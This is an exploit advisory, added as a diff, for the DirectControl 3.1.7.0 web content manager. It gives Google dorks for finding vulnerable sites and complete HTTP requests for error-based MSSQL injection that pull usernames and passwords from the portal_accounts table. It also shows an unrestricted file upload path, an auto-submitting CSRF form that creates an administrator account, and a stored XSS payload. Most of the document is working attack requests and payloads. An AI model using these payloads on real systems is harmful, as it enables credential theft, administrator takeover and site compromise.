@@ -1,0 +1,138 @@
+DirectControlTM Version 3.1.7.0  - Multiple Vulnerabilties
+====================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : www.directclarity.com
+.:. Dork           : [1]intext:"DirectClarity, LLC All Rights Reserved."
+                     [2]inurl:"/cm/password_retrieve.asp?redir_id=1"
+####################################################################
+
+################################
+[1] Sql Injection
+===================
+type: Post String Mssql Injection
+
+
+extrct version database:
+-------------------------
+
+POST /cm/password_retrieve.asp HTTP/1.1
+Host: www.server.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://site/cm/password_retrieve.asp
+Cookie: __utma=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
+redir_id=1&uname=' and+1=cast(@@version as int)--
+-&email_password=Email+My+Password
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/html
+Cache-Control: private
+Server: Microsoft-IIS/7.5
+X-Powered-By: ASP.NET
+Date:
+Content-Length: 352
+
+
+
+
+redir_id=1&uname=|command|&email_password=Email+My+Password
+
+
+extrct Username & password:
+----------------------------
+
+information:
+tablename:portal_accounts
+columns: username , password
+
+
+POST /cm/password_retrieve.asp HTTP/1.1
+Host: www.server.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://site/cm/password_retrieve.asp
+Cookie: __utma=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
+redir_id=1&uname=' and+1=cast((Select TOP 1 username from portal_accounts)
+as int)
+-- -&email_password=Email+My+Password
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/html
+Cache-Control: private
+Server: Microsoft-IIS/7.5
+X-Powered-By: ASP.NET
+Date:
+Content-Length: 352
+
+
+username:
+redir_id=1&uname=' and+1=cast((Select TOP 1 username from portal_accounts)
+as int)
+-- -&email_password=Email+My+Password
+
+password:
+redir_id=1&uname=' and+1=cast((Select TOP 1 password from portal_accounts)
+as int)
+-- -&email_password=Email+My+Password
+
+
+[2] Arbitrary File Upload
+==========================
+
+http://site/cm/fileManage/default.asp?action=UploadFiles&path=/cm/media/images
+
+your file:
+http://site/cm/media/images
+
+
+[3] CSRF [Add Admin]
+=====================
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="http://site/cm/admin.asp">
+<input type="hidden" name="fname" value="...."/>
+<input type="hidden" name="lname" value="...."/>
+<input type="hidden" name="uname" value="admin"/>
+<input type="hidden" name="pword" value="123456"/>
+<input type="hidden" name="telco" value="...."/>
+<input type="hidden" name="email" value="...."/>
+<input type="hidden" name="ustat" value="0"/>
+<input type="hidden" name="SecGroupDropDown" value="1"/>
+<input type="hidden" name="AddButton" value="ADD THIS USER"/>
+<input type="hidden" name="pageView" value="User Administration"/>
+<input type="hidden" name="pageAction" value="Add System User"/>
+<input type="hidden" name="whatDo" value="AddUserAction"/>
+</form>
+</body>
+</html>
+
+
+[4] Cross Site Scripting
+=========================
+
+Go to:
+http://site/cm/admin.asp?pageView=General Configuration&pageAction=RSS
+Management
+
+and add new channel
+put in new channel:
+<script>alert(document.cookie);</script>
+
+and submit!
+
+####################################################################
